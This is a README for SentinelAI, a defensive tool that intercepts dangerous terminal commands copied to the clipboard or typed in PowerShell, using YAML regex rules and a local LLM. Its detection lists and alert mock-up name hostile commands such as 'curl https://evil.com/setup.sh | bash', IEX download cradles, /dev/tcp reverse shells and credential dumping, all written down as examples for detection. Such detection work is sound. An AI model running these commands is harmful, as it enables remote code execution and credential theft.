# SentinelAI

**AI-powered endpoint safety assistant that intercepts dangerous terminal commands before they execute.**

SentinelAI protects against one of the most underrated attack vectors in cybersecurity: **social engineering via terminal commands**. Attackers trick users into pasting malicious commands into PowerShell or a terminal by disguising them as "support instructions," "quick fixes," or install scripts. SentinelAI sits between the clipboard and the shell, analyzing every command before it can cause damage.

> Built as a portfolio project to demonstrate hybrid AI architecture, security engineering, and desktop application development. All analysis runs **100% locally** — no data ever leaves your machine.

---

## How It Works

SentinelAI uses a two-layer detection pipeline designed to balance speed, accuracy, and privacy:

```
User copies command from web / Discord / email
           │
           ▼
   ┌───────────────────┐
   │  Clipboard Monitor │  polls every 500ms, filters with heuristics
   └────────┬──────────┘
            │ suspicious command detected
            ▼
   ┌───────────────────┐
   │   Rule Engine      │  27 YAML rules, regex matching, ~2ms latency
   └────────┬──────────┘
            │
    ┌───────┴───────┐
    │ HIGH/CRITICAL? │
    │  → block now  │ ←── Fast path: no LLM needed
    └───────┬───────┘
            │ ambiguous / low severity
            ▼
   ┌───────────────────┐
   │   Local LLM        │  Ollama (llama3.1:8b or phi3), ~1-3s, fully offline
   │   (Ollama)         │  structured JSON output, confidence threshold
   └────────┬──────────┘
            │
            ▼
   ┌───────────────────┐
   │   Alert Dialog     │  risk badge + plain-English explanation
   │                    │  Block (default) or Allow Anyway
   └────────┬──────────┘
            │
            ▼
   ┌───────────────────┐
   │   Audit Log        │  SQLite, local only, never transmitted
   └───────────────────┘
```

### Why this architecture?

| Layer | Purpose | Latency |
|---|---|---|
| **Rule engine** | Catches known-bad patterns with certainty — `curl \| bash`, encoded PowerShell, reverse shells, AMSI bypass | ~2ms |
| **Local LLM** | Reasons about novel or ambiguous commands the rules don't cover | ~1-3s |
| **Graceful fallback** | If Ollama is offline, rules still run. SentinelAI never fails open. | — |

The LLM only runs when the rule engine is uncertain — this keeps interactive latency acceptable while extending coverage to attacks the rules haven't seen before.

---

## Features

- **Clipboard interception** — detects malicious commands the moment you copy them, before you paste
- **PowerShell shell hook** — catches commands typed directly in PowerShell via a PSReadLine Enter-key interceptor
- **Plain-English explanations** — tells you *why* a command is dangerous, not just that it is
- **27 detection rules** across 4 categories: remote execution, PowerShell-specific attacks, Unix persistence, and obfuscation techniques
- **Local LLM reasoning** via Ollama — extends coverage to novel attacks without any cloud dependency
- **Dark-themed dashboard** — audit log, live stats, settings, all in one window
- **Privacy-first** — no telemetry, no cloud calls, no data collection. Everything stays in `~/.sentinelai/`
- **98 unit tests** covering true positives, true negatives (false-positive regression), CLI behavior, and audit log integrity

---

## Detection Coverage

### Remote Execution
- `curl https://... | bash` / `wget ... | sh`
- `IEX (New-Object Net.WebClient).DownloadString(...)`
- `irm https://... | iex`

### PowerShell Attacks
- Encoded command execution (`-EncodedCommand`)
- AMSI bypass attempts
- Execution policy bypass
- Credential dumping (Mimikatz, Kerberoast)
- Registry persistence
- Hidden window execution

### Obfuscation
- Base64 blobs in commands
- Character-code string construction (`[char]115 + [char]104 + ...`)
- String reversal and chained `.Replace()` tricks
- Unicode lookalike character substitution (Cyrillic spoofing)

### Persistence & Privilege Escalation
- SSH authorized_keys injection
- Shell profile modification (`.bashrc`, `.zshrc`)
- Crontab and `schtasks` manipulation
- Reverse shells (`bash -i >& /dev/tcp/...`)
- SUID bit abuse

---

## Alert Dialog

When a dangerous command is detected, SentinelAI shows a modal over all windows:

```
┌─────────────────────────────────────────────────────────────┐
│  🛡 SentinelAI                          [ CRITICAL RISK ]   │
│  Dangerous command detected in your clipboard               │
│  Detected by rule engine                                    │
├─────────────────────────────────────────────────────────────┤
│  Command                                                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  curl https://evil.com/setup.sh | bash              │   │
│  └─────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────┤
│  Why this is dangerous                                      │
│  This command downloads a script from the internet and      │
│  immediately executes it without saving it to disk first.   │
│  You have no opportunity to inspect what it contains        │
│  before it runs with your permissions.                      │
├─────────────────────────────────────────────────────────────┤
│  Threats identified                                         │
│    •  [BASE001] Remote Script Pipe Execution                │
│    •  [BASE002] Remote Script Download and Execute          │
├─────────────────────────────────────────────────────────────┤
│  Review the command carefully before allowing.              │
│                         [Allow Anyway]  [Block (Recommended)]│
└─────────────────────────────────────────────────────────────┘
```

---

## Installation

### Requirements

- Python 3.11+
- [Ollama](https://ollama.com) (optional — rules still run without it)
- PowerShell 5.1+ with PSReadLine (for shell hook)

### Quick Start

```bash
git clone https://github.com/Cammybamy/sentinelai.git
cd sentinelai

python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\Activate.ps1

pip install -e .
python -m sentinelai             # Starts tray icon + clipboard monitor
```

The dashboard opens by clicking the tray icon.

### Pull an Ollama Model (optional but recommended)

```bash
ollama pull llama3.1:8b     # ~5GB, best coverage
# or
ollama pull phi3:mini        # ~2GB, faster on lower-end hardware
```

If Ollama isn't running, SentinelAI falls back to rules-only mode automatically.

### PowerShell Shell Hook (Windows)

Intercepts commands as you type them in PowerShell — not just clipboard pastes:

```powershell
# Run from the sentinelai repo root
.\shell\install_hook.ps1
```

This copies the PSM1 module to your PowerShell modules directory and adds `Import-Module SentinelAI` to your profile. Restart PowerShell to activate. To remove: `Unregister-SentinelAIHook`.

---

## Dashboard

Open from the tray icon (click or right-click → Open Dashboard).

**Monitor tab** — live status, today's stats (analyzed / blocked / allowed), recent detections feed that updates in real time.

**Audit Log tab** — full history of every analyzed command. Click any row to expand the complete explanation and rule breakdown.

**Settings tab** — change the Ollama model, copy the PS hook install command, view version and rules count.

---

## Architecture Deep Dive

### Rule Engine (`src/sentinelai/core/rule_engine.py`)

Rules are defined in YAML and compiled to regexes at startup. Each rule supports `any` (OR) or `all` (AND) matching across multiple patterns:

```yaml
- id: BASE001
  name: Remote Script Pipe Execution
  severity: critical
  match: all       # ALL patterns must fire
  patterns:
    - "(curl|wget|Invoke-WebRequest|iwr|irm)\\b"
    - "\\|\\s*(bash|sh|zsh|powershell|pwsh|cmd)\\b"
  explanation: >
    This command downloads a script from the internet and immediately
    executes it without saving it to disk first...
  tags: [remote-execution, pipe-execution, critical]
```

Adding a new rule requires only editing a YAML file — no Python changes needed.

### LLM Client (`src/sentinelai/core/llm_client.py`)

Sends a structured prompt to a local Ollama model requesting a typed JSON verdict:

```json
{
  "risk_level": "critical",
  "confidence": 0.94,
  "verdict": "block",
  "explanation": "...",
  "dangerous_elements": ["..."]
}
```

Temperature is set to 0.1 to minimize hallucinations in security-critical output. The system prompt explicitly instructs the model to return `"safe"` for benign commands like `ls` or `git status`.

### Analyzer Orchestrator (`src/sentinelai/core/analyzer.py`)

```
evaluate(command)
  │
  ├─ rule_engine.evaluate()
  │       │
  │       ├─ severity >= HIGH?  →  return RuleVerdict (fast path)
  │       └─ severity < HIGH?   →  escalate to LLM
  │
  └─ llm_client.analyze()
          │
          ├─ confidence >= 0.6?  →  return LLMVerdict
          ├─ LLM rated lower than rules?  →  trust rules
          └─ LLM unavailable?  →  FallbackVerdict (rules only)
```

### Clipboard Monitor (`src/sentinelai/monitors/clipboard.py`)

Runs in a `QThread` to never block the UI. A lightweight heuristic filter runs in Python before any subprocess call — commands like `ls`, `git status`, `docker ps` are rejected in under 0.1ms without touching the rule engine.

### Shell Hook (`shell/SentinelAI.psm1`)

Uses PSReadLine's `Set-PSReadLineKeyHandler` to intercept the Enter key. A PowerShell-native benign-command filter (`$BenignFirstTokens` HashSet) runs first — if the command starts with `git`, `ls`, `cd`, etc., the key is accepted immediately with zero overhead. Suspicious commands pipe to the Python CLI via stdin, avoiding all quoting issues:

```powershell
$result = $line | & $python -m sentinelai.cli analyze - --shell powershell --skip-llm
```

---

## Testing

```bash
pip install -e ".[dev]"
pytest tests/unit/ -v
```

**98 tests** across 4 test files:

| File | What it tests |
|---|---|
| `test_rule_engine.py` | 16 true-positive attack patterns, 29 benign commands (false-positive regression), structural tests |
| `test_clipboard_heuristic.py` | Command-detection filter: 14 suspicious patterns that must flag, 11 benign strings that must not |
| `test_audit_log.py` | SQLite round-trips, ordering, limit, field integrity |
| `test_cli.py` | CLI output shape, dangerous commands block, benign commands pass, stdin/argument modes |

---

## Building a Distributable

### Windows (produces `SentinelAI-Setup.exe`)

```powershell
.\.venv\Scripts\Activate.ps1
.\scripts\build_windows.ps1
```

Requires [Inno Setup](https://jrsoftware.org/isdl.php) for the installer step (optional — the bare `.exe` is in `dist\SentinelAI\` regardless).

### macOS (produces `SentinelAI.app`)

```bash
source .venv/bin/activate
./scripts/build_mac.sh
```

The macOS bundle sets `LSUIElement = YES` so it runs as a background app with no Dock icon.

---

## Roadmap

- **v0.2** — Browser extension that flags "copy this command" instructions on web pages before the user copies anything
- **v0.3** — Behavioral analysis: detect reconnaissance command sequences (`whoami && net user && ipconfig`) that individually look benign but together signal post-exploitation
- **v0.4** — Community rule packs: signed, versioned YAML rule sets distributed via GitHub, auto-updatable with no telemetry
- **v1.0** — WMI process-creation monitoring (catches commands run outside monitored shells)

---

## Privacy

SentinelAI is built privacy-first by design:

- **No telemetry.** No usage data, crash reports, or analytics are collected or transmitted.
- **No cloud calls.** The LLM runs locally via Ollama. Commands are never sent to any external API.
- **Local storage only.** The audit log is a SQLite file at `~/.sentinelai/audit.db` that never leaves your machine.
- **Open rule definitions.** Every detection rule is a human-readable YAML file you can audit, modify, or delete.

---

## Project Structure

```
sentinelai/
├── src/sentinelai/
│   ├── core/               # Rule engine, LLM client, analyzer, data models
│   ├── monitors/           # Clipboard monitor (runs in QThread)
│   ├── storage/            # SQLite audit log
│   ├── ui/                 # Alert dialog, dashboard, system tray
│   ├── config/
│   │   ├── settings.py
│   │   └── rules/          # YAML detection rules (4 files, 27 rules)
│   └── cli.py              # JSON CLI used by the PowerShell hook
├── shell/
│   ├── SentinelAI.psm1     # PowerShell module (PSReadLine hook)
│   └── install_hook.ps1    # One-command installer
├── scripts/
│   ├── build_windows.ps1   # PyInstaller → Inno Setup
│   ├── build_mac.sh        # PyInstaller → .dmg
│   └── installer.iss       # Inno Setup configuration
├── sentinelai.spec         # PyInstaller build spec
└── tests/unit/             # 98 tests
```

---

## License

MIT
